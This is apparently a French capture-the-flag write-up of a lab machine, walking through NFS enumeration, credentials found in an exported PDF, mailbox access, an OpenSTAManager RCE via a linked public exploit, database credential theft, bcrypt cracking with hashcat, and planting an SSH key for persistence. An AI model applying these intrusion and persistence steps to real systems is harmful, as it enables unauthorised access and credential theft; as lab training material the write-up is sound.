# Port enum
```bash
nmap -sC -sV -Pn -p- 10.129.193.108
```

```bash
┌──(kali㉿kali)-[/usr/…/metasploit-framework/data/exploits/mysql]
└─$ nmap -sC -sV -Pn -p- 10.129.193.162
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-03 13:20 +0100
Nmap scan report for 10.129.193.162
Host is up (0.048s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS PIPELINING CAPA RESP-CODES TOP UIDL
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36006/udp   mountd
|   100005  1,2,3      37798/udp6  mountd
|   100005  1,2,3      53737/tcp   mountd
|   100005  1,2,3      54451/tcp6  mountd
|   100021  1,3,4      38737/tcp   nlockmgr
|   100021  1,3,4      38885/tcp6  nlockmgr
|   100021  1,3,4      47129/udp6  nlockmgr
|   100021  1,3,4      48791/udp   nlockmgr
|   100024  1          32967/tcp   status
|   100024  1          34461/tcp6  status
|   100024  1          39966/udp   status
|   100024  1          58028/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: more IMAP4rev1 post-login STARTTLS LOGINDISABLEDA0001 Pre-login capabilities OK ID SASL-IR listed IDLE ENABLE LOGIN-REFERRALS LITERAL+ have
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: more LITERAL+ IMAP4rev1 post-login OK capabilities Pre-login ID SASL-IR listed AUTH=PLAINA0001 ENABLE LOGIN-REFERRALS IDLE have
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING CAPA RESP-CODES TOP UIDL
2049/tcp  open  nfs_acl  3 (RPC #100227)
32967/tcp open  status   1 (RPC #100024)
38737/tcp open  nlockmgr 1-4 (RPC #100021)
43513/tcp open  mountd   1-3 (RPC #100005)
47951/tcp open  mountd   1-3 (RPC #100005)
53737/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.13 seconds
```

Pas grand chose sur le site web

Par contre sur le nfs

```bash
┌──(kali㉿kali)-[/usr/…/metasploit-framework/data/exploits/mysql]
└─$ showmount -e enigma.htb    
Export list for enigma.htb:
/srv/nfs/onboarding *
┌──(kali㉿kali)-[/usr/…/metasploit-framework/data/exploits/mysql]
└─$ sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /mnt/enigma
┌──(kali㉿kali)-[/usr/…/metasploit-framework/data/exploits/mysql]
└─$ ls /mnt/enigma                                        
New_Employee_Access.pdf
┌──(kali㉿kali)-[~/htb/enigma]
└─$ cp /mnt/enigma/New_Employee_Access.pdf ./     
┌──(kali㉿kali)-[~/htb/enigma]
└─$ pdftotext New_Employee_Access.pdf
┌──(kali㉿kali)-[~/htb/enigma]
└─$ cat New_Employee_Access.txt 
Enigma Corp
IT Department - New Employee System Access

Employee:

Kevin Mitchell

Department:

Operations

Provisioned by:

IT Department

Date:

2024-03-01

Webmail Access
URL:

http://mail001.enigma.htb

Username:

kevin

Password:

Enigma2024!

Please change your password upon first login.
For support contact: it@enigma.htb
This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.
Generated automatically by Enigma Corp Identity Management System.
```

Bingo on a accès a un email, on voit un mail envoyé par sarah et quand on essaye on peut se connecter au compte de sarah avec les login de kevin

Dans les mail de sarah on a les login admin a une plateforme de support

User: admin
Password: Ne3s4rtars78s

On voit qu'on est sur un OpenSTAManager V2.9.8, il a plusieurs CVE (CVE-2026-24417, CVE-2026-24416, CVE-2026-38751)

J'ai exploiter la CVE-2026-38751 avec https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751?tab=readme-ov-file

En regardant dans /etc/passwd on peut voir que seul haris a un shell donc c'est le seul vrai user de cette machine (surement la ou est le flag)

Si on cat config.inc.php du dossier ˜/html/openstagemanager on trouve des creds de DB

user: brollin
password: Fri3nds@9099
db: openstamanager

```SQL
SHOW DATABASES;
USE openstamanager;
SHOW TABLES;
SELECT * FROM zz_users;
```

On obtient le hash du mot de passe de haris

On le passe dans hashcat

```bash
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ hashcat -m 3200 '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' /usr/share/wordlists/rockyou.txt   
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 1468/2937 MB (1468 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 512 MB (1315 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNp...ZDr6eC
Time.Started.....: Tue Nov  3 14:12:34 2026 (9 secs)
Time.Estimated...: Tue Nov  3 14:12:43 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       69 H/s (6.74ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 672/14344385 (0.00%)
Rejected.........: 0/672 (0.00%)
Restore.Point....: 656/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: bettyboop -> kelly

Started: Tue Nov  3 14:12:18 2026
Stopped: Tue Nov  3 14:12:45 2026
```

le mdp est donc bestfriends

On peut pas ssh, il autorise uniquement les public key, par contre on peut passer par le reverse shell pour `su` et on trouve le premier flag dans le home de haris

Puis on peut donc injecter une clé ssh dans haris pour ne plus dépendre du reverse shell (que j'ai fais crash 10 fois lol)

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFoQwrjcvtZqi8WYxrycVFnirco637glPq0vZ1+M2jhf" >> /home/haris/.ssh/authorized_keys
```

Avec l'accès SSH j'utilise netstat pour lister les ports utilisé

```bash
haris@enigma:~$ netstat -lntu
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:38543           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:47099           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:59777           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:60039           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:49995           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN     
tcp6       0      0 :::35991                :::*                    LISTEN     
tcp6       0      0 :::58599                :::*                    LISTEN     
tcp6       0      0 ::1:25                  :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::2049                 :::*                    LISTEN     
tcp6       0      0 :::57379                :::*                    LISTEN     
tcp6       0      0 :::53287                :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::110                  :::*                    LISTEN     
tcp6       0      0 :::111                  :::*                    LISTEN     
tcp6       0      0 :::143                  :::*                    LISTEN     
tcp6       0      0 :::45865                :::*                    LISTEN     
tcp6       0      0 :::993                  :::*                    LISTEN     
tcp6       0      0 :::995                  :::*                    LISTEN     
udp        0      0 0.0.0.0:111             0.0.0.0:*                          
udp        0      0 0.0.0.0:49848           0.0.0.0:*                          
udp        0      0 0.0.0.0:45764           0.0.0.0:*                          
udp        0      0 0.0.0.0:56098           0.0.0.0:*                          
udp        0      0 127.0.0.1:906           0.0.0.0:*                          
udp        0      0 0.0.0.0:46171           0.0.0.0:*                          
udp        0      0 0.0.0.0:46823           0.0.0.0:*                          
udp        0      0 127.0.0.54:53           0.0.0.0:*                          
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
udp6       0      0 :::111                  :::*                               
udp6       0      0 :::60142                :::*                               
udp6       0      0 :::33557                :::*                               
udp6       0      0 :::56421                :::*                               
udp6       0      0 :::46836                :::*                               
udp6       0      0 :::53265                :::* 
```